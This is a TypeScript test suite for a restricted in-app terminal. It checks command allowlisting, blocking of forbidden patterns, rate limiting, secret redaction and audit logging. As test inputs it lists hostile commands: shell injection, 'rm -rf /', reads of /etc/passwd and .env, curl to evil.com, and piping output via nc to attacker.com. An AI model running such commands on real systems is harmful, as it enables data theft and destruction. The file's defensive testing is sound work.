/**
 * Terminal Module Tests — Chain 5: Embedded Governed Terminal
 * 
 * Comprehensive tests for:
 * - Command allowlist validation
 * - Command parser
 * - Rate limiting
 * - Output redaction
 * - Command execution with audit logging
 */

import { describe, it, expect, beforeEach, afterEach, vi } from 'vitest';

import {
  // Allowlist
  ALLOWED_COMMANDS,
  FORBIDDEN_PATTERNS,
  findMatchingPattern,
  containsForbiddenPattern,
  extractArguments,
  validateArguments,
  getAllowedCommandDescriptions,
  
  // Parser
  getCommandParser,
  resetCommandParser,
  parseAndValidate,
  isCommandAllowed,
  isCommandForbidden,
  
  // Rate limiter
  getRateLimiter,
  resetRateLimiter,
  checkRateLimit,
  recordCommand,
  isSessionBlocked,
  DEFAULT_RATE_LIMIT_CONFIG,
  
  // Redaction
  getRedactionEngine,
  resetRedactionEngine,
  redactOutput,
  redactWithDetails,
  outputContainsSecrets,
  
  // Executor
  getCommandExecutor,
  resetCommandExecutor,
  getTerminalAuditLogger,
  resetTerminalAuditLogger,
  executeCommand,
  getSessionAuditEvents,
} from '../index';

import type { SiteContext } from '../types';

// =============================================================================
// TEST UTILITIES
// =============================================================================

function createTestSiteContext(overrides?: Partial<SiteContext>): SiteContext {
  return {
    slug: 'test-site',
    name: 'Test Site',
    rootPath: '/sites/test-site',
    environment: 'preview',
    ...overrides,
  };
}

// =============================================================================
// ALLOWLIST TESTS
// =============================================================================

describe('Command Allowlist', () => {
  describe('ALLOWED_COMMANDS', () => {
    it('should have immutable command list', () => {
      expect(Object.isFrozen(ALLOWED_COMMANDS)).toBe(true);
    });
    
    it('should contain all required site commands', () => {
      const siteActions = ALLOWED_COMMANDS
        .filter(c => c.category === 'site')
        .map(c => c.action);
      
      expect(siteActions).toContain('list');
      expect(siteActions).toContain('use');
      expect(siteActions).toContain('status');
      expect(siteActions).toContain('build');
      expect(siteActions).toContain('deploy');
      expect(siteActions).toContain('rollback');
    });
    
    it('should contain allowed git commands', () => {
      const gitActions = ALLOWED_COMMANDS
        .filter(c => c.category === 'git')
        .map(c => c.action);
      
      expect(gitActions).toContain('status');
      expect(gitActions).toContain('log');
    });
  });
  
  describe('FORBIDDEN_PATTERNS', () => {
    it('should have immutable forbidden list', () => {
      expect(Object.isFrozen(FORBIDDEN_PATTERNS)).toBe(true);
    });
    
    it('should block shell injection attempts', () => {
      expect(containsForbiddenPattern('site list; rm -rf /')).not.toBeNull();
      expect(containsForbiddenPattern('site list | cat /etc/passwd')).not.toBeNull();
      expect(containsForbiddenPattern('$(whoami)')).not.toBeNull();
      expect(containsForbiddenPattern('`id`')).not.toBeNull();
    });
    
    it('should block network commands', () => {
      expect(containsForbiddenPattern('curl http://evil.com')).not.toBeNull();
      expect(containsForbiddenPattern('wget http://evil.com')).not.toBeNull();
      expect(containsForbiddenPattern('ssh user@host')).not.toBeNull();
    });
    
    it('should block dangerous file operations', () => {
      expect(containsForbiddenPattern('rm -rf /')).not.toBeNull();
      expect(containsForbiddenPattern('chmod 777 /etc')).not.toBeNull();
    });
    
    it('should block environment/secret access', () => {
      expect(containsForbiddenPattern('env')).not.toBeNull();
      expect(containsForbiddenPattern('printenv')).not.toBeNull();
      expect(containsForbiddenPattern('cat .env')).not.toBeNull();
      expect(containsForbiddenPattern('echo $SECRET')).not.toBeNull();
    });
    
    it('should block package managers', () => {
      expect(containsForbiddenPattern('npm install malware')).not.toBeNull();
      expect(containsForbiddenPattern('yarn add evil-pkg')).not.toBeNull();
      expect(containsForbiddenPattern('pip install keylogger')).not.toBeNull();
    });
    
    it('should block dangerous git operations', () => {
      expect(containsForbiddenPattern('git push origin main')).not.toBeNull();
      expect(containsForbiddenPattern('git commit -m "hack"')).not.toBeNull();
      expect(containsForbiddenPattern('git reset --hard')).not.toBeNull();
    });
  });
  
  describe('findMatchingPattern', () => {
    it('should match "site list"', () => {
      const pattern = findMatchingPattern('site list');
      expect(pattern).not.toBeNull();
      expect(pattern?.action).toBe('list');
    });
    
    it('should match "site use <slug>"', () => {
      const pattern = findMatchingPattern('site use my-site');
      expect(pattern).not.toBeNull();
      expect(pattern?.action).toBe('use');
    });
    
    it('should match "site deploy --env preview"', () => {
      const pattern = findMatchingPattern('site deploy --env preview');
      expect(pattern).not.toBeNull();
      expect(pattern?.action).toBe('deploy');
    });
    
    it('should match "git log -n 20"', () => {
      const pattern = findMatchingPattern('git log -n 20');
      expect(pattern).not.toBeNull();
      expect(pattern?.action).toBe('log');
    });
    
    it('should not match invalid commands', () => {
      expect(findMatchingPattern('ls -la')).toBeNull();
      expect(findMatchingPattern('cat /etc/passwd')).toBeNull();
      expect(findMatchingPattern('arbitrary command')).toBeNull();
    });
  });
  
  describe('extractArguments', () => {
    it('should extract slug from "site use"', () => {
      const pattern = findMatchingPattern('site use my-site');
      const args = extractArguments('site use my-site', pattern!);
      expect(args).toEqual(['my-site']);
    });
    
    it('should extract env from "site deploy --env"', () => {
      const pattern = findMatchingPattern('site deploy --env staging');
      const args = extractArguments('site deploy --env staging', pattern!);
      expect(args).toEqual(['staging']);
    });
    
    it('should extract count from "git log -n"', () => {
      const pattern = findMatchingPattern('git log -n 15');
      const args = extractArguments('git log -n 15', pattern!);
      expect(args).toEqual(['15']);
    });
  });
  
  describe('getAllowedCommandDescriptions', () => {
    it('should return descriptions for all commands', () => {
      const descriptions = getAllowedCommandDescriptions();
      expect(descriptions.length).toBe(ALLOWED_COMMANDS.length);
      
      for (const desc of descriptions) {
        expect(desc.command).toBeTruthy();
        expect(desc.description).toBeTruthy();
      }
    });
  });
});

// =============================================================================
// COMMAND PARSER TESTS
// =============================================================================

describe('CommandParser', () => {
  beforeEach(() => {
    resetCommandParser();
  });
  
  afterEach(() => {
    resetCommandParser();
  });
  
  describe('validate', () => {
    const siteContext = createTestSiteContext();
    
    it('should validate allowed commands', () => {
      const result = parseAndValidate('site list', null);
      expect(result.valid).toBe(true);
      expect(result.command).toBeDefined();
    });
    
    it('should block empty commands', () => {
      const result = parseAndValidate('', siteContext);
      expect(result.valid).toBe(false);
      expect(result.blockedReason).toBe('invalid-syntax');
    });
    
    it('should block forbidden commands', () => {
      const result = parseAndValidate('curl http://evil.com', siteContext);
      expect(result.valid).toBe(false);
      expect(result.blockedReason).toBe('forbidden-command');
    });
    
    it('should block commands not in allowlist', () => {
      const result = parseAndValidate('whoami', siteContext);
      expect(result.valid).toBe(false);
      expect(result.blockedReason).toBe('not-in-allowlist');
    });
    
    it('should require site context for site status', () => {
      const result = parseAndValidate('site status', null);
      expect(result.valid).toBe(false);
      expect(result.blockedReason).toBe('no-site-context');
    });
    
    it('should allow site status with context', () => {
      const result = parseAndValidate('site status', siteContext);
      expect(result.valid).toBe(true);
    });
    
    it('should validate deploy environment', () => {
      // Valid environments
      expect(parseAndValidate('site deploy --env preview', siteContext).valid).toBe(true);
      expect(parseAndValidate('site deploy --env staging', siteContext).valid).toBe(true);
      expect(parseAndValidate('site deploy --env prod', siteContext).valid).toBe(true);
      
      // Invalid environment
      expect(parseAndValidate('site deploy --env invalid', siteContext).valid).toBe(false);
    });
    
    it('should validate version format for rollback', () => {
      expect(parseAndValidate('site rollback --to v1.2.3', siteContext).valid).toBe(true);
      expect(parseAndValidate('site rollback --to 1.2.3', siteContext).valid).toBe(true);
      expect(parseAndValidate('site rollback --to v1.0.0-beta.1', siteContext).valid).toBe(true);
    });
    
    it('should validate git log count', () => {
      expect(parseAndValidate('git log -n 5', siteContext).valid).toBe(true);
      expect(parseAndValidate('git log -n 20', siteContext).valid).toBe(true);
      expect(parseAndValidate('git log -n 99', siteContext).valid).toBe(true);
    });
  });
  
  describe('isCommandAllowed / isCommandForbidden', () => {
    it('should correctly identify allowed commands', () => {
      expect(isCommandAllowed('site list')).toBe(true);
      expect(isCommandAllowed('site use test-site')).toBe(true);
      expect(isCommandAllowed('git status')).toBe(true);
    });
    
    it('should correctly identify forbidden commands', () => {
      expect(isCommandForbidden('curl http://evil.com')).toBe(true);
      expect(isCommandForbidden('rm -rf /')).toBe(true);
      expect(isCommandForbidden('npm install')).toBe(true);
    });
  });
});

// =============================================================================
// RATE LIMITER TESTS
// =============================================================================

describe('RateLimiter', () => {
  beforeEach(() => {
    resetRateLimiter();
    vi.useFakeTimers();
  });
  
  afterEach(() => {
    resetRateLimiter();
    vi.useRealTimers();
  });
  
  describe('check', () => {
    it('should allow commands within limit', () => {
      const sessionId = 'test-session';
      const result = checkRateLimit(sessionId);
      
      expect(result.allowed).toBe(true);
      expect(result.remaining).toBe(DEFAULT_RATE_LIMIT_CONFIG.maxCommands);
    });
    
    it('should track remaining commands', () => {
      const sessionId = 'test-session';
      
      // Record some commands
      for (let i = 0; i < 5; i++) {
        recordCommand(sessionId);
      }
      
      const result = checkRateLimit(sessionId);
      expect(result.allowed).toBe(true);
      expect(result.remaining).toBe(DEFAULT_RATE_LIMIT_CONFIG.maxCommands - 5);
    });
    
    it('should block when limit exceeded', () => {
      const sessionId = 'test-session';
      
      // Exhaust the limit
      for (let i = 0; i < DEFAULT_RATE_LIMIT_CONFIG.maxCommands; i++) {
        recordCommand(sessionId);
      }
      
      const result = checkRateLimit(sessionId);
      expect(result.allowed).toBe(false);
      expect(result.remaining).toBe(0);
    });
  });
  
  describe('record', () => {
    it('should decrement remaining after recording', () => {
      const sessionId = 'test-session';
      
      const before = checkRateLimit(sessionId);
      recordCommand(sessionId);
      const after = checkRateLimit(sessionId);
      
      expect(after.remaining).toBe(before.remaining - 1);
    });
  });
  
  describe('block/unblock', () => {
    it('should block session manually', () => {
      const sessionId = 'test-session';
      const limiter = getRateLimiter();
      
      limiter.block(sessionId);
      
      expect(isSessionBlocked(sessionId)).toBe(true);
    });
    
    it('should unblock session', () => {
      const sessionId = 'test-session';
      const limiter = getRateLimiter();
      
      limiter.block(sessionId);
      limiter.unblock(sessionId);
      
      expect(isSessionBlocked(sessionId)).toBe(false);
    });
    
    it('should expire blocks after duration', () => {
      const sessionId = 'test-session';
      const limiter = getRateLimiter();
      
      limiter.block(sessionId, 1000); // 1 second block
      
      expect(isSessionBlocked(sessionId)).toBe(true);
      
      vi.advanceTimersByTime(1500); // Advance past block
      
      expect(isSessionBlocked(sessionId)).toBe(false);
    });
  });
  
  describe('window sliding', () => {
    it('should allow commands after window expires', () => {
      const sessionId = 'test-session';
      
      // Exhaust the limit
      for (let i = 0; i < DEFAULT_RATE_LIMIT_CONFIG.maxCommands; i++) {
        recordCommand(sessionId);
      }
      
      expect(checkRateLimit(sessionId).allowed).toBe(false);
      
      // Advance past window
      vi.advanceTimersByTime(DEFAULT_RATE_LIMIT_CONFIG.windowMs + 1000);
      
      expect(checkRateLimit(sessionId).allowed).toBe(true);
    });
  });
});

// =============================================================================
// REDACTION ENGINE TESTS
// =============================================================================

describe('RedactionEngine', () => {
  beforeEach(() => {
    resetRedactionEngine();
  });
  
  afterEach(() => {
    resetRedactionEngine();
  });
  
  describe('redact', () => {
    it('should redact API keys', () => {
      const input = 'API_KEY=xk_fake_abc123xyz789def456';
      const result = redactWithDetails(input);
      
      expect(result.redacted).toContain('[REDACTED]');
      expect(result.redacted).not.toContain('abc123xyz789def456');
      expect(result.redactionCount).toBeGreaterThan(0);
    });
    
    it('should redact Bearer tokens', () => {
      const input = 'Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.test.signature';
      const result = redactOutput(input);
      
      expect(result).toContain('[REDACTED]');
      expect(result).not.toContain('eyJhbGciOiJIUzI1NiJ9');
    });
    
    it('should redact GitHub tokens', () => {
      const input = 'GITHUB_TOKEN=ghp_xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx';
      const result = redactOutput(input);
      
      expect(result).toContain('[REDACTED');
      expect(result).not.toContain('ghp_');
    });
    
    it('should redact AWS keys', () => {
      const input = 'AWS key: AKIAIOSFODNN7EXAMPLE';
      const result = redactOutput(input);
      
      expect(result).toContain('[REDACTED');
      expect(result).not.toContain('AKIAIOSFODNN7EXAMPLE');
    });
    
    it('should redact database URLs', () => {
      const input = 'postgres://user:password123@localhost:5432/db';
      const result = redactOutput(input);
      
      expect(result).toContain('[REDACTED');
      expect(result).not.toContain('password123');
    });
    
    it('should redact Stripe keys', () => {
      const input = 'xk_fake_xxxxxxxxxxxxxxxxxxxxxxxx';
      const result = redactOutput(input);
      
      expect(result).toContain('[REDACTED');
    });
    
    it('should redact passwords', () => {
      const input = 'password=mysecretpassword123';
      const result = redactOutput(input);
      
      expect(result).toContain('[REDACTED]');
      expect(result).not.toContain('mysecretpassword123');
    });
    
    it('should handle multiple secrets in one text', () => {
      const input = `
        API_KEY=xk_fake_123456789012345678
        DATABASE_URL=postgres://user:pass@host/db
        GITHUB_TOKEN=ghp_1234567890123456789012345678901234567890
      `;
      const result = redactWithDetails(input);
      
      expect(result.redactionCount).toBeGreaterThanOrEqual(3);
      expect(result.patternsMatched.length).toBeGreaterThanOrEqual(2);
    });
    
    it('should not modify text without secrets', () => {
      const input = 'This is a normal log message without secrets';
      const result = redactWithDetails(input);
      
      expect(result.redacted).toBe(input);
      expect(result.redactionCount).toBe(0);
    });
  });
  
  describe('containsSecrets', () => {
    it('should detect secrets', () => {
      // API key with 16+ char value
      expect(outputContainsSecrets('api_key=secret123456789012345')).toBe(true);
      // Bearer token format
      expect(outputContainsSecrets('Bearer eyJhbGciOiJIUzI1NiJ9.test')).toBe(true);
      // GitHub token format (ghp_ + 36 chars)
      expect(outputContainsSecrets('ghp_abcdefghijklmnopqrstuvwxyz1234567890')).toBe(true);
    });
    
    it('should not flag clean text', () => {
      expect(outputContainsSecrets('Hello world')).toBe(false);
      expect(outputContainsSecrets('Build completed successfully')).toBe(false);
    });
  });
});

// =============================================================================
// COMMAND EXECUTOR TESTS
// =============================================================================

describe('CommandExecutor', () => {
  beforeEach(() => {
    resetCommandExecutor();
    resetCommandParser();
    resetRateLimiter();
    resetRedactionEngine();
    vi.useFakeTimers();
  });
  
  afterEach(() => {
    resetCommandExecutor();
    resetTerminalAuditLogger();
    resetCommandParser();
    resetRateLimiter();
    resetRedactionEngine();
    vi.useRealTimers();
  });
  
  describe('session management', () => {
    it('should create a session', () => {
      const executor = getCommandExecutor();
      const session = executor.createSession('session-1', 'user-1');
      
      expect(session.id).toBe('session-1');
      expect(session.userId).toBe('user-1');
      expect(session.currentSite).toBeNull();
    });
    
    it('should retrieve existing session', () => {
      const executor = getCommandExecutor();
      executor.createSession('session-1', 'user-1');
      
      const retrieved = executor.getSession('session-1');
      expect(retrieved).not.toBeNull();
      expect(retrieved?.id).toBe('session-1');
    });
    
    it('should end session', () => {
      const executor = getCommandExecutor();
      executor.createSession('session-1', 'user-1');
      executor.endSession('session-1');
      
      expect(executor.getSession('session-1')).toBeNull();
    });
  });
  
  describe('execute', () => {
    it('should execute allowed commands', async () => {
      const executor = getCommandExecutor();
      executor.createSession('session-1', 'user-1');
      
      const result = await executeCommand('session-1', 'site list');
      
      expect(result.success).toBe(true);
      expect(result.blocked).toBe(false);
      expect(result.exitCode).toBe(0);
      expect(result.redactedOutput).toContain('Available sites');
    });
    
    it('should block forbidden commands', async () => {
      const executor = getCommandExecutor();
      executor.createSession('session-1', 'user-1');
      
      const result = await executeCommand('session-1', 'curl http://evil.com');
      
      expect(result.success).toBe(false);
      expect(result.blocked).toBe(true);
      expect(result.blockedReason).toBe('forbidden-command');
      expect(result.exitCode).toBe(403);
    });
    
    it('should block non-allowlisted commands', async () => {
      const executor = getCommandExecutor();
      executor.createSession('session-1', 'user-1');
      
      const result = await executeCommand('session-1', 'ls -la');
      
      expect(result.success).toBe(false);
      expect(result.blocked).toBe(true);
      expect(result.blockedReason).toBe('not-in-allowlist');
    });
    
    it('should require site context for status', async () => {
      const executor = getCommandExecutor();
      executor.createSession('session-1', 'user-1');
      
      const result = await executeCommand('session-1', 'site status');
      
      expect(result.success).toBe(false);
      expect(result.blocked).toBe(true);
      expect(result.blockedReason).toBe('no-site-context');
    });
    
    it('should set site context with "site use"', async () => {
      const executor = getCommandExecutor();
      executor.createSession('session-1', 'user-1');
      
      const result = await executeCommand('session-1', 'site use xtx396');
      
      expect(result.success).toBe(true);
      expect(result.redactedOutput).toContain('xtx396');
      
      // Verify context is set
      const session = executor.getSession('session-1');
      expect(session?.currentSite?.slug).toBe('xtx396');
    });
    
    it('should execute commands after setting site context', async () => {
      const executor = getCommandExecutor();
      executor.createSession('session-1', 'user-1');
      
      await executeCommand('session-1', 'site use xtx396');
      const result = await executeCommand('session-1', 'site status');
      
      expect(result.success).toBe(true);
      expect(result.redactedOutput).toContain('Status');
    });
    
    it('should redact secrets in output', async () => {
      // This test ensures redaction is applied to output
      const engine = getRedactionEngine();
      
      // Add a pattern that matches something in mock output
      // (Mock output is clean, so this verifies the engine runs)
      const result = redactWithDetails('API_KEY=xk_fake_123456789012345678');
      expect(result.redacted).toContain('[REDACTED]');
    });
    
    it('should enforce rate limits', async () => {
      const executor = getCommandExecutor();
      executor.createSession('session-1', 'user-1');
      
      // Exhaust rate limit
      for (let i = 0; i < 10; i++) {
        await executeCommand('session-1', 'site list');
      }
      
      const result = await executeCommand('session-1', 'site list');
      
      expect(result.success).toBe(false);
      expect(result.blocked).toBe(true);
      expect(result.blockedReason).toBe('rate-limited');
      expect(result.exitCode).toBe(429);
    });
  });
  
  describe('audit logging', () => {
    it('should log all commands', async () => {
      const executor = getCommandExecutor();
      executor.createSession('session-1', 'user-1');
      
      await executeCommand('session-1', 'site list');
      
      const events = getSessionAuditEvents('session-1');
      
      expect(events.length).toBeGreaterThan(0);
      expect(events.some(e => e.type === 'command_received')).toBe(true);
      expect(events.some(e => e.type === 'command_validated')).toBe(true);
      expect(events.some(e => e.type === 'command_executed')).toBe(true);
    });
    
    it('should log blocked commands', async () => {
      const executor = getCommandExecutor();
      executor.createSession('session-1', 'user-1');
      
      await executeCommand('session-1', 'curl http://evil.com');
      
      const events = getSessionAuditEvents('session-1');
      
      expect(events.some(e => e.type === 'command_blocked')).toBe(true);
      expect(events.some(e => e.result === 'blocked')).toBe(true);
    });
    
    it('should log rate limit violations', async () => {
      const executor = getCommandExecutor();
      executor.createSession('session-1', 'user-1');
      
      // Exhaust rate limit
      for (let i = 0; i < 11; i++) {
        await executeCommand('session-1', 'site list');
      }
      
      const events = getSessionAuditEvents('session-1');
      
      expect(events.some(e => e.type === 'rate_limited')).toBe(true);
    });
    
    it('should log session lifecycle', async () => {
      const executor = getCommandExecutor();
      
      executor.createSession('session-1', 'user-1');
      executor.endSession('session-1');
      
      const events = getTerminalAuditLogger().getEvents({ sessionId: 'session-1' });
      
      expect(events.some(e => e.type === 'session_started')).toBe(true);
      expect(events.some(e => e.type === 'session_ended')).toBe(true);
    });
    
    it('should log site context changes', async () => {
      const executor = getCommandExecutor();
      executor.createSession('session-1', 'user-1');
      
      await executeCommand('session-1', 'site use xtx396');
      
      const events = getSessionAuditEvents('session-1');
      
      expect(events.some(e => e.type === 'site_context_changed')).toBe(true);
    });
  });
});

// =============================================================================
// INTEGRATION TESTS
// =============================================================================

describe('Integration Tests', () => {
  beforeEach(() => {
    resetCommandExecutor();
    resetCommandParser();
    resetRateLimiter();
    resetRedactionEngine();
    vi.useFakeTimers();
  });
  
  afterEach(() => {
    resetCommandExecutor();
    resetTerminalAuditLogger();
    resetCommandParser();
    resetRateLimiter();
    resetRedactionEngine();
    vi.useRealTimers();
  });
  
  it('should complete a full workflow', async () => {
    const executor = getCommandExecutor();
    executor.createSession('session-1', 'user-1');
    
    // 1. List sites
    const listResult = await executeCommand('session-1', 'site list');
    expect(listResult.success).toBe(true);
    expect(listResult.redactedOutput).toContain('Available sites');
    
    // 2. Select a site
    const useResult = await executeCommand('session-1', 'site use xtx396');
    expect(useResult.success).toBe(true);
    
    // 3. Check status
    const statusResult = await executeCommand('session-1', 'site status');
    expect(statusResult.success).toBe(true);
    
    // 4. Build
    const buildResult = await executeCommand('session-1', 'site build');
    expect(buildResult.success).toBe(true);
    expect(buildResult.redactedOutput).toContain('Build completed');
    
    // 5. Deploy to preview
    const deployResult = await executeCommand('session-1', 'site deploy --env preview');
    expect(deployResult.success).toBe(true);
    expect(deployResult.redactedOutput).toContain('Deployment complete');
    
    // 6. Check git status
    const gitResult = await executeCommand('session-1', 'git status');
    expect(gitResult.success).toBe(true);
    
    // 7. Check git log
    const logResult = await executeCommand('session-1', 'git log -n 5');
    expect(logResult.success).toBe(true);
    
    // Verify all commands were logged
    const events = getSessionAuditEvents('session-1');
    const executedEvents = events.filter(e => e.type === 'command_executed');
    expect(executedEvents.length).toBeGreaterThanOrEqual(7);
  });
  
  it('should block all shell injection attempts', async () => {
    const executor = getCommandExecutor();
    executor.createSession('session-1', 'user-1');
    
    const attacks = [
      'site list; rm -rf /',
      'site list && cat /etc/passwd',
      'site list | nc attacker.com 9999',
      '$(whoami)',
      '`id`',
      'site list > /tmp/output',
      'site list < /etc/passwd',
      'echo $HOME',
      '../../../etc/passwd',
    ];
    
    for (const attack of attacks) {
      const result = await executeCommand('session-1', attack);
      expect(result.blocked).toBe(true);
      expect(result.success).toBe(false);
    }
  });
  
  it('should handle rapid command execution with rate limiting', async () => {
    const executor = getCommandExecutor();
    executor.createSession('session-1', 'user-1');
    
    let allowed = 0;
    let blocked = 0;
    
    // Fire 20 commands rapidly
    for (let i = 0; i < 20; i++) {
      const result = await executeCommand('session-1', 'site list');
      if (result.success) {
        allowed++;
      } else if (result.blockedReason === 'rate-limited') {
        blocked++;
      }
    }
    
    // Should have some allowed and some blocked
    expect(allowed).toBeLessThanOrEqual(DEFAULT_RATE_LIMIT_CONFIG.maxCommands);
    expect(blocked).toBeGreaterThan(0);
  });
});
